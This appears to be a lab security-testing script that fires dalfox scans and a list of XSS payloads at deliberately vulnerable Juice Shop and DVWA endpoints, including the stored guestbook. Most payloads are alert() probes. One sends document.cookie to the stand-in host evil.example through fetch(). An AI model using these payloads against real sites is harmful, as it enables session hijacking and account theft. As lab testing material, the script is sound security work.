#!/bin/bash
# Cross-Site Scripting (XSS) payload suite
# Tools: dalfox, curl
# Targets: Juice Shop search, DVWA XSS reflected/stored endpoints
# Estimated duration: 2-4 minutes
set -euo pipefail

TARGET="${1:?Usage: 02-xss.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] XSS suite against ${TARGET}"
echo ""

# --- dalfox automated tests ---
echo "[+] Running dalfox against Juice Shop search..."
dalfox url "${BASE}/juice-shop/rest/products/search?q=test" \
  --silence --no-color --timeout 10 ||
  echo "WARN: dalfox juice-shop scan returned non-zero"

echo ""
echo "[+] Running dalfox against DVWA XSS reflected..."
dalfox url "${BASE}/dvwa/vulnerabilities/xss_r/?name=test" \
  --silence --no-color --timeout 10 ||
  echo "WARN: dalfox dvwa xss_r scan returned non-zero"

echo ""

# --- Direct curl-based XSS payloads ---
echo "[+] Sending direct XSS payloads via curl..."

PAYLOADS=(
  '<script>alert("XSS")</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '<body onload=alert(1)>'
  '"><script>alert(document.cookie)</script>'
  "javascript:alert('XSS')"
  '<iframe src="javascript:alert(1)">'
  '<input onfocus=alert(1) autofocus>'
  '<marquee onstart=alert(1)>'
  '<details open ontoggle=alert(1)>'
  '<svg><script>alert&#40;1&#41;</script></svg>'
  '"><img src=x onerror=fetch("https://evil.example/steal?c="+document.cookie)>'
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}")

  echo "  Payload: ${payload}"

  # Juice Shop search
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/juice-shop/rest/products/search?q=${encoded}" \
    --max-time 10) || code="ERR"
  echo "    juice-shop/search     -> HTTP ${code}"

  # DVWA XSS reflected
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/dvwa/vulnerabilities/xss_r/?name=${encoded}" \
    --max-time 10) || code="ERR"
  echo "    dvwa/xss_r            -> HTTP ${code}"

  # DVWA XSS stored (POST)
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/dvwa/vulnerabilities/xss_s/" \
    -d "txtName=attacker&mtxMessage=${encoded}&btnSign=Sign+Guestbook" \
    --max-time 10) || code="ERR"
  echo "    dvwa/xss_s (POST)     -> HTTP ${code}"
done

echo ""
echo "[*] XSS suite complete"
